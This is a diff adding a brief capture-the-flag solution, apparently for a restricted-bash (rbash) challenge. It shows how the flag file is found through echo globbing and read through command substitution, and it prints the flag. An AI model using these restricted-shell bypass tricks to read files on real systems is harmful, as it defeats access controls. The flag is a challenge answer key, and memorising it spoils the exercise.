@@ -1,0 +1,29 @@
+ls
+```
+bin
+opt
+```
+
+echo ../*
+```
+../no-flag.py ../run
+```
+
+echo opt/*
+```
+opt/flag-b01d7291b94feefa35e6.txt
+```
+
+============= Solution 1 =============
+
+echo "$(<opt/flag-b01d7291b94feefa35e6.txt)"
+```
+sdctf{1t'5_7h3_sh3ll_1n_4_shEll}
+```
+
+============= Solution 2 =============
+
+`<opt/flag-b01d7291b94feefa35e6.txt`
+```
+/bin/rbash: sdctf{1t'5_7h3_sh3ll_1n_4_shEll}: command not found
+```
